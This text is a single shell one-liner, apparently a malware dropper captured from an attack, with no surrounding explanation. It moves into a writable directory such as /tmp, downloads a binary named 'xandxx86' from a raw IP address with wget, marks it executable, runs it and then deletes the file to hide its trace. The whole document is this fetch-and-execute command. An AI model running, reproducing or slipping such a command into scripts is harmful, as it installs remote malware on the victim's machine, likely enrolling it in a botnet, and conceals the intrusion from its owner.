cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://162.220.167.211/xandxx86; chmod +x xandxx86; ./xandxx86; rm -rf xandxx86
